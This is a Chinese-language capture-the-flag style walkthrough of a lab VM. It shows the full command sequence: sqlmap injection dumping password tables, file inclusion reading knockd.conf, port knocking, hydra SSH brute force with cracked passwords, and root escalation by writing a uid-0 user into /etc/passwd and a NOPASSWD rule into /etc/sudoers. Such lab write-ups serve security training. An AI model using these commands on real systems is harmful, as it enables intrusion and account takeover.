# 信息收集

### 1.主机发现

    
    
    srp-scan -l  
    靶机IP:192.168.1.118  
    攻击机：192.168.1.110

![1666101011_634eaf1309e5de64f17e2.png!small?1666101010980](https://image.3001.net/images/20221018/1666101011_634eaf1309e5de64f17e2.png!small?1666101010980)

### 2.端口扫描 22、80

![1666101022_634eaf1e26b0c37180651.png!small?1666101021893](https://image.3001.net/images/20221018/1666101022_634eaf1e26b0c37180651.png!small?1666101021893)

### 3.访问网页

![1666101035_634eaf2b8332ca773fba6.png!small?1666101035198](https://image.3001.net/images/20221018/1666101035_634eaf2b8332ca773fba6.png!small?1666101035198)

    
    
    http://192.168.1.118/display.php 用户信息  
    http://192.168.1.118/manage.php 用户登录  
    http://192.168.1.118/search.php 搜索，可能存在注入

  

### 4.目录扫描

    
    
    feroxbuster -u http://192.168.1.118 -e -s 200 301  
    dirsearch -u http://192.168.1.118 -i 200 301

![1666101057_634eaf41d153da9880276.png!small?1666101057643](https://image.3001.net/images/20221018/1666101057_634eaf41d153da9880276.png!small?1666101057643)

![1666101071_634eaf4f53ddc9db54854.png!small?1666101071141](https://image.3001.net/images/20221018/1666101071_634eaf4f53ddc9db54854.png!small?1666101071141)

# 渗透过程

### 1.检查搜索页面可能的存在的SQL注入

将bp抓到的搜索页面的包复制粘贴到kali的一个.txt文件里面。

![1666101087_634eaf5f5dbba219095c8.png!small?1666101087178](https://image.3001.net/images/20221018/1666101087_634eaf5f5dbba219095c8.png!small?1666101087178)

SqlMap进行检测发现注入点

payload:

    
    
    sqlmap -r post.txt --batch //batch默认Yes

![1666101101_634eaf6d10157ac894447.png!small?1666101101242](https://image.3001.net/images/20221018/1666101101_634eaf6d10157ac894447.png!small?1666101101242)

### 2.Sqlmap获取利用信息。

payload:

    
    
    sqlmap -r post.txt --batch -D Staff -T Users -C "Username,Password" --dump

![1666101114_634eaf7a62f1a4ff78326.png!small?1666101114015](https://image.3001.net/images/20221018/1666101114_634eaf7a62f1a4ff78326.png!small?1666101114015)

密码解密transorbital1

![1666101124_634eaf84b930a99542431.png!small?1666101124718](https://image.3001.net/images/20221018/1666101124_634eaf84b930a99542431.png!small?1666101124718)

登录成功：

![1666101136_634eaf9008e20fbf2e615.png!small?1666101135881](https://image.3001.net/images/20221018/1666101136_634eaf9008e20fbf2e615.png!small?1666101135881)

payload:

    
    
    sqlmap -r post.txt --batch -D users -T UserDetails -C "username,password" --dump

![1666101149_634eaf9d329377c1a6364.png!small?1666101149044](https://image.3001.net/images/20221018/1666101149_634eaf9d329377c1a6364.png!small?1666101149044)

### 3.登录admin用户收集信息

    
    
    http://192.168.1.118/welcome.php  
    http://192.168.1.118/addrecord.php 添加用户信息

![1666101160_634eafa8c203fab900497.png!small?1666101160463](https://image.3001.net/images/20221018/1666101160_634eafa8c203fab900497.png!small?1666101160463)

![1666101173_634eafb519a9dda00dff6.png!small?1666101172743](https://image.3001.net/images/20221018/1666101173_634eafb519a9dda00dff6.png!small?1666101172743)

  

管理员用户界面显示页面不存在。(可能存在文件包含)

尝试：

![1666101194_634eafca7145b21a3a5cf.png!small?1666101194571](https://image.3001.net/images/20221018/1666101194_634eafca7145b21a3a5cf.png!small?1666101194571)

![1666101205_634eafd5c5683a66c27d8.png!small?1666101205449](https://image.3001.net/images/20221018/1666101205_634eafd5c5683a66c27d8.png!small?1666101205449)

  

![1666101218_634eafe2cadaba158e938.png!small?1666101218573](https://image.3001.net/images/20221018/1666101218_634eafe2cadaba158e938.png!small?1666101218573)

  

/proc/sched_debug调度相关的详细信息,里面又每个处理器上的可运行进程详细信息。

knockd端口敲门服务，knockd是
一种端口试探服务器。knockd可以将服务器隐藏起来，这样端口扫描工具就扫不到服务开放的端口，使用自定义的序列号敲门才能开启所需服务的端口。它默认配置文件/etc/knockd.conf

![1666101235_634eaff372074d750ee08.png!small?1666101235183](https://image.3001.net/images/20221018/1666101235_634eaff372074d750ee08.png!small?1666101235183)

sequence:显示由客户软件用作启动操作的模式的端口序列。

seq_timeout:客户端完成端口试探的最大时间。

### 4.查看/etc/knockd.conf文件信息

端口序列：7469、8475、9842 时间显示25s

![1666101249_634eb00149f93ec52808d.png!small?1666101249047](https://image.3001.net/images/20221018/1666101249_634eb00149f93ec52808d.png!small?1666101249047)

### 5.knockd敲门开启ssh服务

用nmap 扫描这三个端口序列。

    
    
    nmap 192.168.1.118 -p 7469  
    nmap 192.168.1.118 -p 8475  
    nmap 192.168.1.118 -p 9842

![1666101262_634eb00e5fcaae66d9929.png!small?1666101262075](https://image.3001.net/images/20221018/1666101262_634eb00e5fcaae66d9929.png!small?1666101262075)

查看192.168.1.118 的22端口

![1666101270_634eb016c93c0939d2c11.png!small?1666101270492](https://image.3001.net/images/20221018/1666101270_634eb016c93c0939d2c11.png!small?1666101270492)

### 6.尝试ssh登录

admin/transorbital1 登录失败。

![1666101290_634eb02a5321cd099ebef.png!small?1666101289994](https://image.3001.net/images/20221018/1666101290_634eb02a5321cd099ebef.png!small?1666101289994)

将UserDetails表中的username,password作为字典hydra爆破92.168.1.118ssh登录。

    
    
    hydra -L username.txt -P password.txt ssh://192.168.1.118 -t 10   
    ​  
    chandlerb UrAG0D!  
    joeyt  Passw0rd  
    janitor   Ilovepeepee

![1666101308_634eb03c835c43de2611b.png!small?1666101308864](https://image.3001.net/images/20221018/1666101308_634eb03c835c43de2611b.png!small?1666101308864)

### 7.ssh登录

ls -al 显示所有目录包含隐藏目录。

    
    
    ssh chandlerb@192.168.1.118

![1666101322_634eb04a2f46b44f89a76.png!small?1666101322130](https://image.3001.net/images/20221018/1666101322_634eb04a2f46b44f89a76.png!small?1666101322130)

  

    
    
    ssh joeyt@192.168.1.118

![1666101339_634eb05bab85a7ecc6219.png!small?1666101339573](https://image.3001.net/images/20221018/1666101339_634eb05bab85a7ecc6219.png!small?1666101339573)

    
    
    ssh janitor@192.168.1.118

![1666101354_634eb06a4fcdb8bcebcac.png!small?1666101354560](https://image.3001.net/images/20221018/1666101354_634eb06a4fcdb8bcebcac.png!small?1666101354560)

  

进入janitor用户的.secrets-for-putin目录，有个密码表

![1666101369_634eb07953f00d104396a.png!small?1666101368995](https://image.3001.net/images/20221018/1666101369_634eb07953f00d104396a.png!small?1666101368995)

### 8.将上面发现的密码放入原先密码文档继续爆破用户

新爆出用户 fredf B4-Tru3-001

![1666101379_634eb083f1e369fec0b4f.png!small?1666101380501](https://image.3001.net/images/20221018/1666101379_634eb083f1e369fec0b4f.png!small?1666101380501)

# 提权

### ssh登录fredf:

    
    
    sudo -l  
    发现nopasswd命令有root权限。

![1666101392_634eb090d5aa894c55974.png!small?1666101392645](https://image.3001.net/images/20221018/1666101392_634eb090d5aa894c55974.png!small?1666101392645)

进入给的路径：

打开/opt/devstuff/dist/test/test发现是个加密文件。

/opt/devstuff/dist/test下一堆.so共享库文件、还有个base_library.zip对提权没啥用。

/opt/devstuff/dist下就一个text文件。

/opt/devstuff/：

![1666101402_634eb09a6b0d242abd3bd.png!small?1666101402266](https://image.3001.net/images/20221018/1666101402_634eb09a6b0d242abd3bd.png!small?1666101402266)

打开test.py文件

    
    
    importsys  
    iflen(sys.argv) != 3:  
    print("Usage: python test.py read append")  
    sys.exit(1)  
    else:  
    f= open(sys.argv[1], "r") #读取sys.argv[1]内容  
    output= (f.read())  
    f= open(sys.argv[2], "a") #将sys.argv[1]内容写入sys.argv[2]  
    f.write(output)  
    f.close()

test.py参考链接：

<https://blog.csdn.net/Mr____Cheng/article/details/124734356>

### 可以利用test.py的代码逻辑像/etc/passwd文件下写入一个用户信息。

openssl工具创建加密用户。

    
    
    openssl passwd -1 -salt test test

![1666101421_634eb0ad9e300120d4d15.png!small?1666101421291](https://image.3001.net/images/20221018/1666101421_634eb0ad9e300120d4d15.png!small?1666101421291)

找个有写权限的目录

![1666101435_634eb0bb641303ec8ae1c.png!small?1666101435157](https://image.3001.net/images/20221018/1666101435_634eb0bb641303ec8ae1c.png!small?1666101435157)

按照/etc/passwd格式写入用户test信息到/tmp/ss,再通过test.py脚本添加到/etc/passwd

    
    
    echo 'test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash' >> /tmp/ss

执行py脚本,切换test用户提权成功

    
    
    sudo ./test /tmp/ss /etc/passwd

![1666101447_634eb0c7330620ea0a776.png!small?1666101447057](https://image.3001.net/images/20221018/1666101447_634eb0c7330620ea0a776.png!small?1666101447057)

  

    
    
    echo 'raa::0:0:::/bin/bash' >> /tmp/shell

### 也可以利用test.py的代码逻辑写一个NOPASSWD用户授权文件写入/etc/sudoers进行提权

    
    
    echo "fredf ALL=(ALL) NOPASSWD: ALL" > /tmp/qq.txt  
      
    sudo ./test /tmp/qq.txt /etc/sudoers  
    sudo su - root

![1666101464_634eb0d852dedc60ef2a0.png!small?1666101464257](https://image.3001.net/images/20221018/1666101464_634eb0d852dedc60ef2a0.png!small?1666101464257)

  

# 总结:

获取admin管理员权限后的文件包含需要细心发现，文件包含参数file需要fuzz

  * <https://www.somd5.com/>md5解密链接。

  * import sys ：<https://blog.csdn.net/Mr____Cheng/article/details/124734356>

  * /etc/knockd.conf ，knockd敲门服务隐藏技术。

  * /etc/passwd 用户信息（添加用户提权）

  * /etc/sudoers 用户免密sudo（将用户设置为免密root）

  * 工具sqlmap、hydra、openssl、dirsearch、feroxbuster

